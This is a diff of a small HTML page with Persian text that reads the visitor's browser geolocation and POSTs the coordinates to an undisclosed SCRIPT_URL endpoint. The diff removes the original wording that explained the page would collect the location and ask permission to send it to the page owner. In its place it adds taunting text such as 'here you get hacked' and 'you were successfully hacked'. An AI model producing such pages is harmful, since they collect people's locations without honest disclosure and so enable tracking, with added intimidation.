@@ -3,19 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>اشتراک موقعیت مکانی</title>
+  <title>هک شو</title>
 </head>
 
 <body>
 
-  <h2>اشتراک موقعیت مکانی</h2>
+  <h2>اینجا هک میشی</h2>
 
   <p>
-    ابتدا موقعیت مکانی شما دریافت می‌شود.
-    سپس از شما برای ارسال آن به صاحب این صفحه اجازه گرفته می‌شود.
+    فقط کافیه رو دکمه کلیک کنی.
   </p>
 
-  <button onclick="getLocation()">دریافت موقعیت</button>
+  <button onclick="getLocation()">اینجا</button>
 
   <p id="result"></p>
 
@@ -28,11 +27,11 @@
 
       if (!navigator.geolocation) {
         result.innerText =
-          "مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.";
+          "شما هک نمیشوید.";
         return;
       }
 
-      result.innerText = "در حال دریافت موقعیت...";
+      result.innerText = "در حال هک شدن...";
 
       navigator.geolocation.getCurrentPosition(
         function(position) {
@@ -41,7 +40,7 @@
           const lon = position.coords.longitude;
 
 
-          result.innerText = "در حال ارسال موقعیت...";
+          result.innerText = "شوخی ندارم...";
 
           fetch(SCRIPT_URL, {
             method: "POST",
@@ -57,11 +56,11 @@
           .then(data => {
 
             result.innerHTML =
-              "موقعیت با موفقیت ارسال شد.<br><br>" +
+              " با موفقیت هک شدید.<br><br>" +
               '<a target="_blank" href="https://www.google.com/maps?q=' +
               encodeURIComponent(lat + "," + lon) +
               '">' +
-              "باز کردن موقعیت در Google Maps" +
+              "اگه هنوزم شک داری کلیک کن" +
               "</a>";
 
           })
